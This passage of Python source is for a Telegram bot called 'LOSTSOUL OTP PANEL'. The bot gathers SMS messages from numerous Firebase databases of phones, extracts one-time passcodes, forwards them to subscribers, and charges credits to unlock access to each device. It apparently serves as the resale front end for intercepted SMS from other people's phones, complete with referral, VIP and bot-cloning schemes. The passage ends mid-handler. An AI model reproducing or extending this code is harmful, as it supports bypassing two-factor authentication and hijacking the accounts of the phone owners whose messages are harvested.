    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🔍 Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            tag = f"[{mask_db_tag(d.db_tag)}] "
            lbl = f"🟢 📱 {tag}{' & '.join(d.numbers)}" if d.numbers else f"🟢 ⚙️ {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("😴 No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="online"), InlineKeyboardButton("📋 All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sim = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    lines = []
    if otp: lines.append(f"🔑 OTP: <code>{otp}</code>")
    lines.append(f"👤 From: {sender}\n📅 Date: {date}")
    if sim: lines.append(f"📲 SIM: {sim}")
    lines.append(f"📱 Number: {num_label}\n\n💬 Message: {body}")
    return "\n".join(lines), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sim = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    if otp:
        sim_line = f"│ 📲 SIM : {sim}\n" if sim else ""
        return (f"✨ <b>NEW OTP RECEIVED</b> ✨\n┏━━━━━━━━━━━━━━━━━\n"
                f"│ 🔑 OTP : <code>{otp}</code>\n│ 📱 Number : {num_label}\n"
                f"│ 👤 From : {sender}\n│ 📅 Date : {date}\n{sim_line}"
                f"┗━━━━━━━━━━━━━━━━━\n💬 {body}")
    return (f"📩 <b>NEW SMS RECEIVED</b>\n┏━━━━━━━━━━━━━━━━━\n"
            f"│ 📱 Number : {num_label}\n│ 👤 From : {sender}\n│ 📅 Date : {date}\n"
            f"┗━━━━━━━━━━━━━━━━━\n💬 {body}")

def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{dev_id}")],
        [InlineKeyboardButton("🔙 Disconnect & Back", callback_data="home")],
    ])

def get_vip_denied_keyboard(chat_id: int) -> InlineKeyboardMarkup:
    ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💸 Get Referral Link To Earn Credits", url=f"https://t.me/share/url?url={ref_link}&text=Try this OTP Panel Bot!")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def locked_device_keyboard(dev_id: str, cost: int, hrs: int, can_afford: bool) -> InlineKeyboardMarkup:
    rows = []
    if can_afford:
        rows.append([InlineKeyboardButton(f"🔓 Unlock ({cost} 💰 / {hrs}h)", callback_data=f"paydev:{dev_id}")])
    else:
        rows.append([InlineKeyboardButton("💸 Earn Credits", callback_data="earn_info")])
    rows.append([InlineKeyboardButton("🔙 Back", callback_data="home")])
    return InlineKeyboardMarkup(rows)

# ══════════════════════════════════════════════════════════════
#  FIREBASE COMMANDER (ADMIN ONLY)
# ══════════════════════════════════════════════════════════════

def firebase_manager_text(page: int = 0, show_urls: bool = False) -> str:
    names = all_db_names()
    total_pages = max(1, (len(names) + DB_PAGE_SIZE - 1) // DB_PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    page_names = names[page * DB_PAGE_SIZE : page * DB_PAGE_SIZE + DB_PAGE_SIZE]
    active_n   = sum(1 for n in names if FIREBASE_STATE.get(n, {}).get("status") == "active")
    hold_n     = sum(1 for n in names if FIREBASE_STATE.get(n, {}).get("status") == "hold")
    inactive_n = sum(1 for n in names if FIREBASE_STATE.get(n, {}).get("status") == "inactive")
    lines = [
        "🗄 <b>FIREBASE COMMANDER</b> <i>(admin only)</i>",
        "━━━━━━━━━━━━━━━━━━",
        f"🟢 Active   : <b>{active_n}</b>",
        f"🟡 Hold     : <b>{hold_n}</b>",
        f"🔴 Inactive : <b>{inactive_n}</b>",
        f"📦 Total    : <b>{len(names)}</b>   📄 {page + 1}/{total_pages}",
        "━━━━━━━━━━━━━━━━━━",
    ]
    for name in page_names:
        st = ensure_state(name)
        icon = status_icon(st["status"])
        dev = st.get("device_count", 0)
        ago = fmt_ago(st.get("last_check", 0))
        if show_urls:
            lines.append(f"{icon} <b>{name}</b>  •  📱 {dev}  •  ⏱ {ago}\n   <code>{DATABASES.get(name,'')}</code>")
        else:
            lines.append(f"{icon} <b>{name}</b>  •  📱 {dev}  •  ⏱ {ago}")
    lines.append("\n<i>Tap a DB for controls. URLs hidden by default.</i>")
    return "\n".join(lines)

def firebase_manager_keyboard(page: int = 0, show_urls: bool = False) -> InlineKeyboardMarkup:
    names = all_db_names()
    total_pages = max(1, (len(names) + DB_PAGE_SIZE - 1) // DB_PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    page_names = names[page * DB_PAGE_SIZE : page * DB_PAGE_SIZE + DB_PAGE_SIZE]
    rows = []
    for name in page_names:
        st = ensure_state(name)
        icon = status_icon(st["status"])
        rows.append([InlineKeyboardButton(f"{icon} {name}", callback_data=f"fbm:{name}:{page}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️", callback_data=f"fbmpg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("▶️", callback_data=f"fbmpg:{page + 1}"))
    rows.append(nav)
    rows.append([
        InlineKeyboardButton("➕ Bulk Add", callback_data="fbm_bulk_add"),
        InlineKeyboardButton("🔎 Verify All", callback_data="fbm_verify_all"),
    ])
    rows.append([
        InlineKeyboardButton("🗑 Purge Inactive", callback_data="fbm_purge_confirm"),
        InlineKeyboardButton("⏸ Hold All", callback_data="fbm_hold_all"),
    ])
    rows.append([InlineKeyboardButton("▶️ Activate All", callback_data="fbm_activate_all")])
    rows.append([InlineKeyboardButton("👁 Toggle URLs", callback_data=f"fbm_toggle_urls:{0 if show_urls else 1}")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="fbm_refresh"), InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")])
    return InlineKeyboardMarkup(rows)

def firebase_db_actions_keyboard(name: str, page: int = 0, show_urls: bool = False) -> InlineKeyboardMarkup:
    st = ensure_state(name)
    rows = []
    if st["status"] == "active":
        rows.append([InlineKeyboardButton("⏸ Hold (pause)", callback_data=f"fbhold:{name}:{page}")])
    elif st["status"] == "hold":
        rows.append([InlineKeyboardButton("▶️ Activate", callback_data=f"fbactive:{name}:{page}")])
    else:
        rows.append([
            InlineKeyboardButton("▶️ Activate", callback_data=f"fbactive:{name}:{page}"),
            InlineKeyboardButton("⏸ Hold",     callback_data=f"fbhold:{name}:{page}"),
        ])
    rows.append([InlineKeyboardButton("🔎 Verify Now", callback_data=f"fbverify:{name}:{page}")])
    rows.append([InlineKeyboardButton("📋 Copy URL", callback_data=f"fbcopy:{name}")])
    rows.append([InlineKeyboardButton("🗑 Delete DB", callback_data=f"fbdel:{name}:{page}")])
    rows.append([InlineKeyboardButton("🔙 Back", callback_data=f"fbmpg:{page}")])
    return InlineKeyboardMarkup(rows)

def firebase_db_detail_text(name: str, show_urls: bool = False) -> str:
    st = ensure_state(name)
    url = DATABASES.get(name, "—")
    url_disp = url if show_urls else mask_url(url)
    return (
        f"🗄 <b>{name}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Status : {status_icon(st['status'])} <b>{status_label(st['status'])}</b>\n"
        f"Devices: <b>{st.get('device_count', 0)}</b>\n"
        f"Fails  : <b>{st.get('fail_count', 0)}</b>\n"
        f"Checked: {fmt_ago(st.get('last_check', 0))}\n"
        f"Added  : {fmt_ago(st.get('added_at', 0))}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"URL:\n<code>{url_disp}</code>"
    )

# ══════════════════════════════════════════════════════════════
#  VERIFY
# ══════════════════════════════════════════════════════════════

async def verify_db(name: str) -> tuple[bool, int, str]:
    url = DATABASES.get(name)
    if not url: return False, 0, "DB not found"
    try:
        devs = await fetch_db_data(name, url)
        st = ensure_state(name)
        st["last_check"] = time.time()
        st["device_count"] = len(devs)
        st["fail_count"] = 0
        if st["status"] == "inactive": st["status"] = "active"
        GLOBAL_DEVICE_CACHE[name] = devs
        return True, len(devs), "OK"
    except Exception as e:
        st = ensure_state(name)
        st["last_check"] = time.time()
        st["fail_count"] = st.get("fail_count", 0) + 1
        if st["fail_count"] >= INACTIVE_THRESHOLD and st["status"] != "hold":
            st["status"] = "inactive"
        return False, 0, str(e)

async def bulk_verify_all() -> dict:
    names = [n for n in all_db_names() if FIREBASE_STATE.get(n, {}).get("status") != "hold"]
    results = await asyncio.gather(*(verify_db(n) for n in names), return_exceptions=True)
    ok = fail = total_devs = 0
    for r in results:
        if isinstance(r, Exception): fail += 1; continue
        good, dev_count, _ = r
        if good: ok += 1; total_devs += dev_count
        else: fail += 1
    return {"ok": ok, "fail": fail, "total_devices": total_devs, "checked": len(names)}

# ══════════════════════════════════════════════════════════════
#  ADMIN PANEL
# ══════════════════════════════════════════════════════════════

def admin_panel_text(bot_token: str) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES[bot_token]["users"]
    total = len(users_db)
    verified = sum(1 for u in users_db.values() if u.get("verified"))
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    total_coins = sum(u.get("coins", 0) for u in users_db.values())
    active_chats = len(chats_registry.get(bot_token, set()))
    active_dbs = sum(1 for n in DATABASES if FIREBASE_STATE.get(n, {}).get("status") == "active")
    cost = CONFIG["access"]["number_cost"]
    hrs = CONFIG["access"]["number_hours"]
    thr = CONFIG["vip"]["coin_threshold"]
    vdur = CONFIG["vip"]["duration_hours"]
    text = (
        f"🛡 <b>LOSTSOUL ADMIN PANEL</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Users          : <b>{total}</b>  (✅ {verified})\n"
        f"📡 Active Chats   : <b>{active_chats}</b>\n"
        f"🏆 OTP Views      : <b>{total_otps}</b>\n"
        f"💰 Coins in System: <b>{total_coins}</b>\n"
        f"🗄 Firebase DBs   : <b>{active_dbs}</b>/{len(DATABASES)}\n"
        f"📢 Force-Join     : <b>{len(CONFIG.get('channels', []))}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔓 Unlock Cost    : <b>{cost}</b> 💰 / <b>{hrs}h</b>\n"
        f"👑 VIP Threshold  : <b>{thr}</b> 💰 → <b>{vdur}h</b>\n"
    )
    if bot_token == TOKEN:
        text += f"🤖 Cloned Bots    : <b>{len(CLONES)}</b>\n"
    text += f"━━━━━━━━━━━━━━━━━━\n🕗 {datetime.now().strftime('%d %b %Y %I:%M %p')}"
    return text

def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("🗄 Firebase Commander", callback_data="fbm_refresh"),
         InlineKeyboardButton("📢 Force-Join Manager", callback_data="fjm_refresh")],
        [InlineKeyboardButton("🔓 Access Engine",      callback_data="acc_refresh"),
         InlineKeyboardButton("👑 VIP Engine",         callback_data="vipeng_refresh")],
        [InlineKeyboardButton("⚙️ Credit Limits",      callback_data="lim_refresh"),
         InlineKeyboardButton("💎 Credit Manager",     callback_data="crm_refresh")],
        [InlineKeyboardButton("🎛 Command Center",     callback_data="cmd_center")],
        [InlineKeyboardButton("📢 Broadcast",          callback_data="admin_broadcast"),
         InlineKeyboardButton("👥 User List",          callback_data="admin_users")],
        [InlineKeyboardButton("🎁 Gift Credits to All", callback_data="admin_gift_coins")],
    ]
    if bot_token != TOKEN:
        keys.append([InlineKeyboardButton("🔗 Add Custom Firebase URL", callback_data="add_custom_db")])
    keys.append([InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"),
                 InlineKeyboardButton("❌ Close",   callback_data="close_msg")])
    return InlineKeyboardMarkup(keys)

def fjm_text() -> str:
    channels = CONFIG.get("channels", [])
    if not channels:
        return ("📢 <b>FORCE-JOIN MANAGER</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "No channels configured yet.\n\n"
                "Bot use karne ke liye force-join OFF hai. Add channels to enable.")
    lines = ["📢 <b>FORCE-JOIN MANAGER</b>", "━━━━━━━━━━━━━━━━━━",
             f"Active channels: <b>{len(channels)}</b>", "━━━━━━━━━━━━━━━━━━"]
    for i, ch in enumerate(channels, 1):
        lines.append(f"{i}. <b>{ch['name']}</b>\n   @{ch['username']}\n   <code>{ch['url']}</code>")
    return "\n".join(lines)

def fjm_keyboard() -> InlineKeyboardMarkup:
    rows = []
    channels = CONFIG.get("channels", [])
    for i, ch in enumerate(channels):
        rows.append([InlineKeyboardButton(f"🗑 Remove #{i+1} {ch['name']}", callback_data=f"fjm_rm:{i}")])
    rows.append([InlineKeyboardButton("➕ Add Channel", callback_data="fjm_add")])
    rows.append([InlineKeyboardButton("🗑 Remove All", callback_data="fjm_rm_all")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="fjm_refresh"),
                 InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")])
    return InlineKeyboardMarkup(rows)

LIMIT_DEFS = [
    ("start_bonus",     "🎁 Start Bonus",         "Credits on first /start"),
    ("refer_bonus",     "💸 Refer Bonus",         "Credits per referral"),
    ("daily_bonus",     "📅 Daily Bonus",         "Credits per daily check-in"),
    ("bot_create_base", "🤖 Bot Create Base",     "Base cost to create own bot"),
    ("bot_create_step", "📈 Bot Create Step",     "Added per bot already created"),
    ("max_referrals",   "🚧 Max Referrals/Day",   "Daily cap on referral bonus"),
    ("max_credits",     "💰 Max Credits Cap",     "Hard ceiling of credits"),
]

def lim_text() -> str:
    c = CONFIG["credits"]
    lines = ["⚙️ <b>LIMIT ENGINE</b>", "━━━━━━━━━━━━━━━━━━",
             "<i>Tap any value to edit.</i>", ""]
    for key, label, desc in LIMIT_DEFS:
        lines.append(f"{label}: <b>{c.get(key, 0)}</b>\n   <i>{desc}</i>")
    return "\n".join(lines)

def lim_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for key, label, _ in LIMIT_DEFS:
        rows.append([InlineKeyboardButton(f"✏️ {label}", callback_data=f"lim_edit:{key}")])
    rows.append([InlineKeyboardButton("♻️ Reset to Default", callback_data="lim_reset")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="lim_refresh"),
                 InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")])
    return InlineKeyboardMarkup(rows)

DEFAULT_LIMITS = {
    "start_bonus": 10, "refer_bonus": 10, "daily_bonus": 5,
    "bot_create_base": 20, "bot_create_step": 10,
    "max_referrals": 100, "max_credits": 100000,
}

def acc_text() -> str:
    a = CONFIG["access"]
    return (
        f"🔓 <b>ACCESS ENGINE</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>Per-device unlock cost & duration.</i>\n\n"
        f"💰 Cost per device : <b>{a.get('number_cost', 5)}</b> credits\n"
        f"⏱ Access duration  : <b>{a.get('number_hours', 6)}</b> hours\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>User pays this many credits to unlock one device for that many hours. VIP users bypass this.</i>"
    )

def acc_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✏️ Edit Cost",         callback_data="acc_edit:number_cost")],
        [InlineKeyboardButton("✏️ Edit Duration (h)", callback_data="acc_edit:number_hours")],
        [InlineKeyboardButton("♻️ Reset Default",     callback_data="acc_reset")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="acc_refresh"),
         InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")],
    ])

def vipeng_text() -> str:
    v = CONFIG["vip"]
    return (
        f"👑 <b>VIP ENGINE</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>VIP grants unlimited access to ALL devices for the duration.</i>\n\n"
        f"<b>Two ways to get VIP:</b>\n"
        f"1️⃣ Admin manually grants (Credit Manager)\n"
        f"2️⃣ User's coins reach threshold → auto-VIP\n\n"
        f"💰 Coin threshold : <b>{v.get('coin_threshold', 500)}</b>\n"
        f"⏱ VIP duration    : <b>{v.get('duration_hours', 24)}h</b>\n"
        f"💸 Auto-deduct     : <b>{'Yes (coins consumed)' if v.get('auto_deduct', True) else 'No (coins kept)'}</b>\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def vipeng_keyboard() -> InlineKeyboardMarkup:
    deduct = CONFIG["vip"].get("auto_deduct", True)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✏️ Edit Coin Threshold", callback_data="vipeng_edit:coin_threshold")],
        [InlineKeyboardButton("✏️ Edit Duration (h)",    callback_data="vipeng_edit:duration_hours")],
        [InlineKeyboardButton(f"💸 Auto-deduct: {'ON' if deduct else 'OFF'}", callback_data="vipeng_toggle")],
        [InlineKeyboardButton("♻️ Reset Default",        callback_data="vipeng_reset")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="vipeng_refresh"),
         InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")],
    ])

def crm_text() -> str:
    total_credits = sum(u.get("coins", 0) for u in all_users.values())
    total_users = len(all_users)
    total_referrals = sum(u.get("referrals", 0) for u in all_users.values())
    vips = sum(1 for u in all_users.values() if u.get("vip_until", 0) > time.time())
    return (
        f"💎 <b>CREDIT MANAGER</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users       : <b>{total_users}</b>\n"
        f"💰 Total Credits     : <b>{total_credits}</b>\n"
        f"💸 Total Referrals   : <b>{total_referrals}</b>\n"
        f"👑 Active VIPs       : <b>{vips}</b>\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def crm_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Give Credits to User",  callback_data="crm_give")],
        [InlineKeyboardButton("➖ Remove Credits",       callback_data="crm_take")],
        [InlineKeyboardButton("👑 Grant VIP (custom h)", callback_data="crm_vip")],
        [InlineKeyboardButton("🎁 Gift to All",          callback_data="admin_gift_coins")],
        [InlineKeyboardButton("🔄 Refresh",              callback_data="crm_refresh"),
         InlineKeyboardButton("🔙 Admin Panel",          callback_data="admin_refresh")],
    ])

COMMANDS_HELP = (
    "🎛 <b>COMMAND CENTER</b>\n"
    "━━━━━━━━━━━━━━━━━━\n"
    "<b>User Commands:</b>\n"
    "<code>/start</code> — Start bot\n"
    "<code>/cancel</code> — Cancel current action\n"
    "\n<b>Admin Commands:</b>\n"
    "<code>/ban ID</code> — Ban user\n"
    "<code>/unban ID</code> — Unban user\n"
    "<code>/give ID AMOUNT</code> — Give credits\n"
    "<code>/take ID AMOUNT</code> — Remove credits\n"
    "<code>/vip ID HOURS</code> — Grant VIP\n"
    "<code>/stats</code> — Global stats\n"
    "<code>/reload</code> — Force reload DBs\n"
)

# ══════════════════════════════════════════════════════════════
#  SAFE EDIT
# ══════════════════════════════════════════════════════════════

async def safe_edit(query, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    try:
        if parse_mode == "HTML":
            text = text.replace("#", "&#35;")
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except BadRequest as e:
        if "not modified" not in str(e).lower():
            tlog(f"Edit Message Error: {e}")
            try:
                await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=disable_web_page_preview)
            except: pass

# ══════════════════════════════════════════════════════════════
#  HANDLERS
# ══════════════════════════════════════════════════════════════

async def send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot):
    if is_main_bot and not users_db[chat_id].get("bonus_10_received"):
        users_db[chat_id]["bonus_10_received"] = True
        bonus = CONFIG["credits"]["start_bonus"]
        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + bonus
        try:
            await ctx.bot.send_message(chat_id,
                f"🎉 <b>WELCOME BONUS</b> 🎉\n\n<b>{bonus} Credits</b> free mile hain!\n\n"
                f"Har device unlock karne ke liye credits use karo.\n"
                f"Refer friends to earn more!",
                parse_mode="HTML")
        except: pass

def _add_credits(uid: int, amount: int, reason: str = ""):
    cap = CONFIG["credits"].get("max_credits", 100000)
    all_users.setdefault(uid, {})
    cur = all_users[uid].get("coins", 0)
    all_users[uid]["coins"] = min(cap, cur + amount)
    hist = all_users[uid].setdefault("coin_history", [])
    hist.insert(0, {"amount": amount, "reason": reason or "add",
                    "time": datetime.now().strftime("%d %b %H:%M")})
    if len(hist) > 15: all_users[uid]["coin_history"] = hist[:15]

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user = update.effective_user
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    if not is_main_bot:
        if bot_token not in CLONES: return
        if time.time() > CLONES[bot_token]["expiry"]:
            await update.message.reply_text("Aapka premium khatam ho gaya.", parse_mode="HTML"); return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
    if users_db.get(chat_id, {}).get("banned"):
        await update.message.reply_text("🚫 You are banned from using this bot.", parse_mode="HTML"); return

    ref_id = int(ctx.args) if ctx.args and ctx.args.isdigit() else None

    if chat_id not in users_db:
        users_db[chat_id] = {
            "name": user.full_name if user else "Unknown",
            "username": user.username or "" if user else "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "verified": False, "referrals": 0, "coins": 0, "vip_until": 0.0,
            "otp_count": 0, "bots_created": 0, "bonus_10_received": False,
            "referred_by": ref_id if ref_id != chat_id else None, "banned": False,
            "number_access": {},
        }
        if is_main_bot and ref_id and ref_id in users_db and ref_id != chat_id:
            cap = CONFIG["credits"].get("max_referrals", 100)
            today = datetime.now().strftime("%Y-%m-%d")
            refer_today = users_db[ref_id].get("refer_today", {"date": today, "count": 0})
            if refer_today["date"] != today:
                refer_today = {"date": today, "count": 0}
            if refer_today["count"] < cap:
                refer_today["count"] += 1
                users_db[ref_id]["refer_today"] = refer_today
                users_db[ref_id]["referrals"] = users_db[ref_id].get("referrals", 0) + 1
                _add_credits(ref_id, CONFIG["credits"]["refer_bonus"], "referral")
                try:
                    await ctx.bot.send_message(ref_id,
                        f"🎉 New referral! +{CONFIG['credits']['refer_bonus']} credits. "
                        f"({refer_today['count']}/{cap} today)", parse_mode="HTML")
                except: pass

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    if check_auto_vip(bot_token, chat_id):
        try:
            await ctx.bot.send_message(chat_id,
                f"👑 <b>AUTO-VIP GRANTED!</b>\nCoins reached threshold!\n"
                f"Duration: <b>{CONFIG['vip']['duration_hours']}h</b> unlimited access!",
                parse_mode="HTML")
        except: pass

    if not users_db[chat_id].get("verified"):
        await send_join_prompt(update, is_main_bot); return

    chats_registry.setdefault(bot_token, set()).add(chat_id)
    coins = users_db[chat_id].get("coins", 0)
    await update.message.reply_text(
        f"✨ <b>LOSTSOUL OTP PANEL</b> ✨\n━━━━━━━━━━━━━━━━━━\n"
        f"Welcome, <b>{user.first_name}</b>!\n"
        f"💰 Credits: <b>{coins}</b>\n"
        f"👑 VIP: {get_vip_time_left(bot_token, chat_id)}\n"
        f"━━━━━━━━━━━━━━━━━━\nUse menu below:",
        reply_markup=get_reply_menu(is_admin, bot_token, chat_id), parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  CALLBACK HANDLER
# ══════════════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    data = query.data or ""
    chat_id = query.message.chat_id
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    if not is_main_bot:
        if bot_token not in CLONES:
            await query.answer("Bot disabled.", show_alert=True); return
        if time.time() > CLONES[bot_token]["expiry"]:
            await query.answer("Premium Expired.", show_alert=True); return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    if users_db.get(chat_id, {}).get("banned"):
        await query.answer("🚫 Banned.", show_alert=True); return
    if is_spamming(chat_id):
        await query.answer("⚠️ Slow down!", show_alert=True); return
    await query.answer()

    try:
        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        if data == "check_join":
            if is_main_bot:
                not_joined = await check_membership(bot_token, ctx.bot, chat_id)
                if not_joined:
                    names = ", ".join(f"@{u}" for u in not_joined)
                    await query.answer(f"❌ Still not joined: {names}", show_alert=True); return
            users_db.setdefault(chat_id, {})["verified"] = True
            chats_registry.setdefault(bot_token, set()).add(chat_id)
            try: await query.message.delete()
            except: pass
            await ctx.bot.send_message(chat_id, "✅ Verification successful!", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
            return

        if data == "earn_info":
            cost = CONFIG["access"]["number_cost"]
            daily = CONFIG["credits"]["daily_bonus"]
            ref = CONFIG["credits"]["refer_bonus"]
            await safe_edit(query,
                f"💸 <b>HOW TO EARN CREDITS</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💰 Unlock cost : <b>{cost}</b> credits per device\n\n"
                f"<b>Earn:</b>\n"
                f"• Daily check-in: +{daily} credits\n"
                f"• Refer a friend: +{ref} credits\n"
                f"• Contact admin for custom top-up",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Back", callback_data="home")]]))
            return

        if data == "cmd_status":
            devices = await get_all_devices(bot_token)
            online = sum(1 for d in devices if d.status == "online")
            await safe_edit(query,
                f"📊 <b>STATUS</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"📱 Total: <b>{len(devices)}</b>\n"
                f"🟢 Online: <b>{online}</b>\n"
                f"🔴 Offline: <b>{len(devices)-online}</b>",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="cmd_status")],
                    [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            return

        if data == "admin_refresh" and is_admin:
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token)); return

        # ─── Firebase Commander ───
        if data.startswith("fbm_refresh") and is_admin:
            await safe_edit(query, firebase_manager_text(0), reply_markup=firebase_manager_keyboard(0)); return
        if data.startswith("fbmpg:") and is_admin:
            page = int(data.split(":")[1])
            await safe_edit(query, firebase_manager_text(page), reply_markup=firebase_manager_keyboard(page)); return
        if data.startswith("fbm_toggle_urls:") and is_admin:
            show = bool(int(data.split(":")[1]))
            await safe_edit(query, firebase_manager_text(0, show_urls=show), reply_markup=firebase_manager_keyboard(0, show_urls=show)); return
        if data.startswith("fbm:") and is_admin and not data.startswith("fbm_"):
            parts = data.split(":")
            name = parts[1]
            page = int(parts[2]) if len(parts) > 2 else 0
            if name not in DATABASES:
                await query.answer("Not found.", show_alert=True); return
            await safe_edit(query, firebase_db_detail_text(name), reply_markup=firebase_db_actions_keyboard(name, page)); return
        if data.startswith("fbhold:") and is_admin:
            parts = data.split(":"); name = parts[1]; page = int(parts[2]) if len(parts) > 2 else 0
            if name in DATABASES:
                ensure_state(name)["status"] = "hold"
                await query.answer(f"⏸ {name} on HOLD")
            await safe_edit(query, firebase_db_detail_text(name), reply_markup=firebase_db_actions_keyboard(name, page)); return
        if data.startswith("fbactive:") and is_admin:
            parts = data.split(":"); name = parts[1]; page = int(parts[2]) if len(parts) > 2 else 0
            if name in DATABASES:
                st = ensure_state(name); st["status"] = "active"; st["fail_count"] = 0
                await query.answer(f"▶️ {name} ACTIVE")
            await safe_edit(query, firebase_db_detail_text(name), reply_markup=firebase_db_actions_keyboard(name, page)); return
        if data.startswith("fbverify:") and is_admin:
            parts = data.split(":"); name = parts[1]; page = int(parts[2]) if len(parts) > 2 else 0
            if name not in DATABASES:
                await query.answer("Not found.", show_alert=True); return
            ok, dc, msg = await verify_db(name)
            await query.answer(f"{'✅' if ok else '❌'} {name}: {dc if ok else msg[:80]}", show_alert=True)
            await safe_edit(query, firebase_db_detail_text(name), reply_markup=firebase_db_actions_keyboard(name, page)); return
        if data.startswith("fbcopy:") and is_admin:
            name = data.split(":")[1]
            url = DATABASES.get(name, "")
            await query.answer(f"URL: {url[:180]}", show_alert=True); return
        if data.startswith("fbdel:") and is_admin:
            parts = data.split(":"); name = parts[1]; page = int(parts[2]) if len(parts) > 2 else 0
            if name not in DATABASES:
                await query.answer("Already gone.", show_alert=True); return
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑 YES DELETE", callback_data=f"fbdel2:{name}:{page}"),
                 InlineKeyboardButton("❌ Cancel", callback_data=f"fbm:{name}:{page}")],
            ])
            await safe_edit(query, f"⚠️ <b>Delete {name}?</b>\nThis removes it permanently.", reply_markup=kb); return
        if data.startswith("fbdel2:") and is_admin:
            parts = data.split(":"); name = parts[1]; page = int(parts[2]) if len(parts) > 2 else 0
